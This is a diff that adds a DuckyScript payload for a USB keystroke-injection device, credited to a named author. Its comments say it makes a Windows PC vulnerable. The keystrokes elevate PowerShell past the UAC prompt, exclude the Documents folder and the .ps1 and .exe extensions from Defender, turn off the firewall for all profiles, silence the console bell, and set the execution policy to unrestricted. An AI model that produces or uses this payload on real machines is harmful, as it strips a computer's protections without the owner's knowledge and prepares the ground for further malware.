@@ -1,0 +1,53 @@
+REM The script ensures that the PC is vulnerable. 
+REM For this purpose, the firewall, the defender 
+REM and the beeps are deactivated. In addition, 
+REM script execution is allowed and a defender 
+REM scan path is marked as blocked.
+REM (c) 2023 Peter Feil
+REM -------------------------------------------------------
+REM Close all Windows
+WINDOWS d
+DELAY 200
+REM Enter commandline
+WINDOWS r
+DELAY 200
+REM Start powershell
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+LEFTARROW
+DELAY 1000
+ENTER
+DELAY 1000
+REM Path exclude from defender. We need it later
+STRING Set-MpPreference -ExclusionPath $env:systemdrive\users\$env:username\Documents
+DELAY 500
+ENTER
+DELAY 1000
+REM Disable Sound
+STRING Set-PSReadlineOption -BellStyle None
+DELAY 500
+ENTER
+DELAY 1000
+REM Disable Firewall
+STRING netsh advfirewall set allprofiles state off
+DELAY 500
+ENTER
+DELAY 1000
+REM Allow ps1-files
+STRING Add-MpPreference -ExclusionExtension ps1 -Force
+DELAY 500
+ENTER
+DELAY 1000
+REM Allow executables
+STRING Add-MpPreference -ExclusionExtension exe -Force 
+DELAY 500
+ENTER
+DELAY 1000
+REM Disable script blocker
+STRING Set-ExecutionPolicy unrestricted -Force
+DELAY 500
+ENTER
+DELAY 1000
+STRING exit
+ENTER
